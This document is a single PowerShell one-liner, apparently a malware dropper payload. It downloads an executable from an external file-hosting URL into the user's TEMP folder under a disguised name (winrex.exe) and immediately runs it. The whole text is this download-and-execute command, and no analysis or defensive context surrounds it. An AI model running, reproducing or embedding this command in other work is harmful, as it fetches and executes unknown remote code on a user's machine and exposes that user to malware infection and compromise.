
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/vhcwbo.exe',"$env:TEMP\winrex.exe");Start-Process ("$env:TEMP\winrex.exe")

